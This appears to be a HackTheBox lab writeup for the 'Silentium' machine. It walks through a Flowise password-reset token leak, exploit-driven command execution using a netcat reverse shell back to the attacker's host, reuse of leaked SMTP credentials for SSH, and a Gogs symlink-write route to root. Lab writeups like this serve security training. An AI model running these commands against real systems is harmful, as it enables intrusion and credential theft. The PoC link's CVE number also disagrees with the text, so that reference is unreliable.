---
layout: post
title: "Silentium - CTF Writeup"
date: 2026-06-04 19:00:00 +0200
description: "Writeup for Silentium CTF."
categories: [hackthebox]
tags: [hackthebox]
---

# Silentium - CTF Writeup

## Reconnaissance

A full TCP scan exposed SSH and an nginx web server. The web server redirected to the virtual host `silentium.htb`.

```bash
nmap -T4 -A -sS -sV -p- 10.129.9.0
```

| Port | Service | Version | Notes |
|------|---------|---------|-------|
| `22/tcp` | SSH | OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 | Ubuntu host |
| `80/tcp` | HTTP | nginx 1.24.0 | Redirects to `silentium.htb` |

Virtual host enumeration revealed another application:

```text
staging.silentium.htb
```

## Web Enumeration

The password reset flow on the staging host returned a useful backend error:

```text
Transaction is not started yet, start transaction before commiting or rolling it back
```

The main site exposed a user named `Ben`, which gave a likely email address:

```text
ben@silentium.htb
```

The staging application was running Flowise `3.0.5`. This version is affected by CVE-2025-58434, where the password reset endpoint exposes a valid `tempToken` in the response. Using the leaked token, I reset Ben's password and authenticated to the staging application.

## Initial Access

After logging in to Flowise, I used the public Flowise `3.0.5` exploit to get command execution:

```bash
python3 exploit.py \
  --email ben@silentium.htb \
  --password '<new-password>' \
  --url http://staging.silentium.htb/ \
  --cmd 'nc <tun0-ip> 1337 -e sh'
```

The container did not have `bash`, so the shell had to be stabilized with `ash`:

```bash
python3 -c 'import pty; pty.spawn("/bin/ash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

## Container Enumeration

The full environment and database dumps were noisy. The important finding was that the container exposed SMTP credentials for the `ben` account:

```text
FLOWISE_USERNAME=ben
SMTP_HOST=mailhog
SMTP_PORT=1025
SMTP_PASSWORD=<reused-password>
```

The SMTP password was reused for SSH, which gave a stable shell as `ben`:

```bash
ssh ben@silentium.htb
```

## Internal Services

From the host, several services were only listening locally:

| Address | Service | Notes |
|---------|---------|-------|
| `127.0.0.1:3000` | Flowise | Internal Flowise service |
| `127.0.0.1:3001` | Gogs | Internal Git service |
| `127.0.0.1:1025` | SMTP | MailHog SMTP |
| `127.0.0.1:8025` | HTTP | MailHog web UI |

The Gogs configuration was readable from:

```text
/opt/gogs/gogs/custom/conf/app.ini
```

The relevant settings were:

```ini
RUN_USER = root

[server]
HTTP_ADDR = 127.0.0.1
HTTP_PORT = 3001
DOMAIN = staging-v2-code.dev.silentium.htb
ROOT_URL = http://staging-v2-code.dev.silentium.htb/

[database]
TYPE = sqlite3
PATH = /opt/gogs/data/gogs.db

[repository]
ROOT_PATH = /root/gogs-repositories
```

The key detail is that Gogs runs as `root` and stores repositories under `/root/gogs-repositories`.

## Privilege Escalation

After adding a public key through Gogs, SSH authentication as `root` reached the Gogs git shell instead of an interactive shell:

```text
Hi there, You've successfully authenticated, but Gogs does not provide shell access.
```

That confirmed the key path was being handled by Gogs, but it did not directly provide root access.

The useful escalation path is the Gogs `PutContents` symlink issue tracked as CVE-2025-8110. With an authenticated Gogs user, the vulnerable API can be abused to write through a repository symlink. Because this instance runs as `root`, that write can target root-owned paths such as `/root/.ssh/authorized_keys`.

Useful target details:

```text
Gogs URL: http://staging-v2-code.dev.silentium.htb/
Gogs data: /opt/gogs/data/gogs.db
Repository root: /root/gogs-repositories
```

References:

- [CVE-2025-58434 - NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-58434)
- [CVE-2025-8110 - NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-8110)
- [CVE-2025-81110 PoC](https://github.com/BridgerAlderson/CVE-2025-81110-PoC)
